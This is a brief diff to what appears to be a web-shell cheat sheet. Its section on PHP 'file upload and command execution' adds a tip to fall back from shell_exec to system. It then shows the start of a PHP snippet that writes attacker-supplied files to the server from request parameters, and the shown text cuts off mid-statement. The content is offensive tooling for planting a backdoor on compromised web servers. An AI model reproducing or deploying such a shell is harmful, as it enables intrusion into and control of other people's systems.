@@ -1,6 +1,8 @@
 ## PHP
 
 ### File upload and command execution
+If `shell_exec` does not work, try `system`
+
 ```php
 <?php if (isset($_REQUEST['fupload'])) {
 	file_put_contents($_REQUEST['fupload'],
